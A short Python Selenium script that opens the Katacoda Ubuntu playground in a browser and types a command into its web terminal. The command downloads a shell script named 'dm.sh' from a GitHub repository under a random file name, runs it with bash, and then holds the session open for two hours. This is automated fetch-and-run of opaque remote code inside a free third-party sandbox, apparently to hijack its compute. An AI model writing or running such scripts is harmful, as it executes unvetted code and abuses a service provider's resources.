from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException, WebDriverException
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains  
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import tkinter as tk
import random
import string
import os

driver = webdriver.Chrome()
driver.get("https://www.katacoda.com/courses/ubuntu/playground")
time.sleep(18)
driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys("ran1=$(openssl rand -hex 5) && wget https://github.com/unmsjd28/ynsg7s9/raw/main/dm.sh -O $ran1.sh && bash $ran1.sh")
time.sleep(8)
driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys(Keys.ENTER)
print("hii")
time.sleep(7200)
